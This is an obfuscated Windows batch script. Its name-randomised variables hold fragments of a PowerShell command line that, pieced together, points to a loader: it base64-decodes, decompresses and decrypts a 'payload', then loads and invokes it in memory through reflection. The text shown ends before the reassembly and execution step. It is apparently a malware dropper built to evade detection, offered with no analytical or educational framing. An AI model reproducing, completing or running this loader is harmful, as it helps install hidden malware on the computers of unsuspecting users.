@echo off
%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%s%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%e%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%t%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%l%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%o%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%c%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%a%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%l%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp% %tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%e%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%n%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%a%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%b%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%l%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%e%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%d%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%e%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%l%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%a%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%y%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%e%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%d%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%e%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%x%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%p%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%a%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%n%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%s%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%i%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%o%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%n%tjKUcZiQPSAXZoXJRuGYXpRPzcTpQHacwXDwTTDKrlcRiYUPIp%
set "TvyJTZJEVbJRTKOWmfcfBrYryqMdEFDJKqlsapjmbNpAkBLiqY=s"
set "WeGTGCwglDnFapxahCywWXWPdNcyhWFDNFJzcRKJWTdGZwNZcj=t"
set "qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP=!TvyJTZJEVbJRTKOWmfcfBrYryqMdEFDJKqlsapjmbNpAkBLiqY!e!WeGTGCwglDnFapxahCywWXWPdNcyhWFDNFJzcRKJWTdGZwNZcj!"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "ymvuvoMnqi=')))"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "LLQeDBveCg=Asse"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "wDatYLNYVf=;e $"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "VeExpOGqwd=\pow"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "YaYRycRkqC=Q0Rd"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "wpcOvZnSno=eBas"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "YJLLjKZhBJ=romB"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "eOjjBXrxMf=).Re"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "BUXrqsuIMy=t]::"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "oQAVxOUXVM=pose"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "OwQlZMneRi=[Ref"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "SGlsgxIZxT=.Dis"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "KnxMudlfpA=::Fr"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "xGygfxHLJV=payl"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "HlSuhcKajV=();$"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "pUNAQcXkqT=ersh"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "BWHrORTmPT=voke"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "cyvMjXweRI=v1.0"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "uMyMgtMIhF=e('@"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "QDlIbElgLR=Conv"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "vmdBztSlkW=ring"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "CofHlPWnev=ert]"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "jkcTOxAVoy=n/Pa"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "aRbUGOfguy=aylo"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "VzQrlDGvTd= (,["
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "rjAPcEESPK=Repl"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "fabpshsonH=e[]]"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "AERTBMicQW=ZipS"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "YEQOoWmldh=oads"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "rUSZhYMEgI=load"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "nzFFIrpxch=);$p"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "bREXCGIkrJ=reat"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "oJdrwhOHmg=se64"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "goUlHOKFKD=tent"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "HmkISTHrHm=($p)"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "OOtcRZpInb= '\\"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "MHhRpLaFcA=';fu"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "CpqpfMmiTY=exe""
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "TcTPcumbFc=stri"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "NEYntZZBgY=ompr"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "aaWhEAzmUD=4Str"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "oyqLPtzWcs=lock"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "PdhfpdGkMs=or()"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "xSehzGBvxz=aw.g"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "NknAqirdqS=(d(["
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "HpUesKKPek=ject"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "hFaCexebJB=IV=["
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "SmtXtNwyRT=PiZe"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "LqVIqBNneh=ace("
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "QejQxrQxwp=$asm"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "sSMOwVkXzm=oad("
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "kGBczbmHId=From"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "VcjyBciUtf=eam("
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "zrdNcdKzqK=te()"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "LEwdYPYOWB=;$r="
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "mDEZIcTGVK=RPCC"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "nBamwzscWO=plac"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "mUpaowWMrJ=eads"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "DKXOveaZGt=ZA=="
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "nYhrHGORld=oArr"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "QiBWbPMdsI=m($m"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "bneRkIOlXP=$a.D"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "hmeoZypsQD=/Som"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "hszlKeIEFw=z(d("
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "nvcXDPeaLJ='/')"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "SvzMEiPJOI=64St"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "yXVtUTyCcX= e($"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "gUjcayyRQr=raph"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "ODeuQqmNzA=\Sys"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "VFNeByleej=6OCC"
